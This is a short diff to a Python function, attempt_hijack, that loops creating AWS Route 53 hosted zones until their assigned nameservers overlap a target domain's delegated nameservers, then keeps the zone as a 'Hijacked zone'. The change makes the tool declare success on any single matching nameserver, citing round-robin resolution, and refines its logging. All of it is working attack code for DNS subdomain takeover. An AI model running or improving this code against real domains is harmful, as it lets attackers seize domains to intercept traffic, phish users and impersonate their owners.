@@ -190,17 +190,20 @@ def attempt_hijack(domain, target_nameservers, route53_client, verbose=False):
             if verbose:
                 logging.info(f'Created zone {hosted_zone_id} with nameservers: {new_name_servers}')
             
-            # Check if ALL target nameservers are in the new nameservers
-            # This is the correct logic - we need all of them to match
-            if target_nameservers.issubset(new_name_servers):
+            # Check if ANY target nameserver matches the new nameservers
+            # Even a single match allows DNS hijacking due to round-robin resolution
+            matching_nameservers = target_nameservers.intersection(new_name_servers)
+            
+            if len(matching_nameservers) > 0:
                 successful_zone = hosted_zone_id
                 logging.info(f'\n✓ SUCCESS after {counter} attempts!')
                 logging.info(f'Hijacked zone ID: {successful_zone}')
-                logging.info(f'Matching nameservers: {new_name_servers}')
+                logging.info(f'Matching nameservers: {matching_nameservers}')
+                logging.info(f'All zone nameservers: {new_name_servers}')
             else:
                 failed_zones.append(hosted_zone_id)
                 if verbose:
-                    logging.info(f'No match - cleaning up zone {hosted_zone_id}')
+                    logging.info(f'No matching nameservers - cleaning up zone {hosted_zone_id}')
         
         # Clean up failed zones
         if failed_zones:
